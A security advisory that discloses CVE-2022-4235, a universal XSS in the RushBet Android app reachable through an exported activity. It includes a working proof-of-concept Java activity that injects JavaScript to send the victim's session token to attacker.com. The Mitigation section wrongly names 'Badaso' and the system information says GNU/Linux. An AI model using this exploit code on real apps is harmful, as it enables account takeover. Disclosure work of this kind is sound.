---
slug: advisories/miller/
title: RushBet 2022.23.1-b490616d - Universal XSS
authors: Carlos Bello
writer: cbello
codename: miller
product: RushBet 2022.23.1-b490616d (UXSS)
date: 2022-11-30 10:00 COT
cveid: CVE-2022-4235
severity: 7.1
description: RushBet 2022.23.1-b490616d    -    Universal XSS (UXSS)
keywords: Fluid Attacks, Security, Vulnerabilities, Rushbet, UXSS
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | RushBet 2022.23.1-b490616d - UXSS                                  |
| **Code name**         | [Miller](https://en.wikipedia.org/wiki/Mac_Miller)                 |
| **Product**           | RushBet                                                            |
| **Affected versions** | Version 2022.23.1-b490616d                                         |
| **State**             | Public                                                             |
| **Release date**      | 2022-11-30                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Universal XSS                                                                                                               |
| **Rule**              | [000. Universal XSS (UXSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/000)                                     |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 7.1                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-4235](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4235)                                               |

## Description

RushBet version 2022.23.1-b490616d allows a remote attacker to steal
customer accounts via a malicious application. This is possible because
the application exposes an activity and does not properly validate the
data it receives.

## Vulnerability

This vulnerability occurs because the application exposes an activity
and does not properly validate the data it receives.

## Exploitation

To exploit this vulnerability, the victim must have a malicious
application installed with activity like the following:

### MainActivity.java

```java
package com.example.badapp;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Handler;
import android.os.Bundle;
import android.net.Uri;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.rush.co.rb","com.sugarhouse.casino.MainActivity");
        intent.setData(Uri.parse("https://rushbet.co/"));
        startActivity(intent);

        new Handler().postDelayed(() -> {
            intent.setAction("Action.EvaluateScript");
            intent.putExtra("KeyScript","fetch('https://attacker.com/sessionID/'+JSON.parse(sessionStorage.getItem('session-COP')).value);");
            startActivity(intent);
        }, 30000);
    }
}
```

Thus, when the victim opens the malicious app, the exploit will
be executed, thus hacking his account.

## Evidence of exploitation

![POC-Account-Takeover-Rushbet](https://user-images.githubusercontent.com/51862990/204822560-80c8fce0-82ec-4a23-bec5-9da689ffea4f.mp4)

![PII-Account-Takeover-Rushbet](https://user-images.githubusercontent.com/51862990/204819582-d5f0b34a-0ec4-4413-ac40-bc06affd3ed1.png)

## Our security policy

We have reserved the CVE-2022-4235 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: RushBet 2022.23.1-b490616d

* Operating System: GNU/Linux

## Mitigation

An updated version of Badaso is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.rushbet.co>

## Timeline

<time-lapse
  discovered="2022-11-29"
  contacted="2022-11-30"
  replied="2022-11-30"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
